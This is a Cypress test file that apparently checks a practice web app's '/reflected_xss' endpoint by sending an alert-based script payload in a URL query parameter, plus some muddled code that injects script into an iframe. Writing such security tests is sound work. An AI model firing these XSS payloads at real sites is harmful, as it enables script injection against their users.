import 'cypress-iframe';

//"window:message" event to log the alert message
Cypress.on('window:message', (e) => {
  if (e.data) {
    cy.log(`Alert message: ${e.data}`);
  }
});

describe('Reflected XSS Test', () => {
  it('should execute a Reflected XSS payload', () => {
    const payload = '<script>alert("XSS Vulnerability!");</script>';
    const vulnerableURL = 'https://app-web-berlin42-50e7ace7d4d7.herokuapp.com/reflected_xss';

    const encodedPayload = encodeURIComponent(payload); // encode the XSS payload

    // Intercept the "window:load" event to insert a script that will post a message containing the alert message
    cy.on('window:load', () => {
      const script = `
        <script>
          const payload = ${JSON.stringify(payload)};
          window.postMessage(payload, '*');
        </script>
      `;
      const iframe = document.createElement('iframe');
      iframe.src = `${vulnerableURL}?foobar=${encodedPayload}`;
      iframe.onload = () => {
        const body = iframe.contentWindow.document.querySelector('body');
        body.insertAdjacentHTML('beforeend', script); // Insert the script into the iframe
      };
      document.body.appendChild(iframe); // Append the iframe to the DOM
    });

    cy.visit(`${vulnerableURL}?foobar=${encodedPayload}`); // Visit the vulnerable URL
    
    cy.wait(1000); // Wait for the payload to execute
  });
});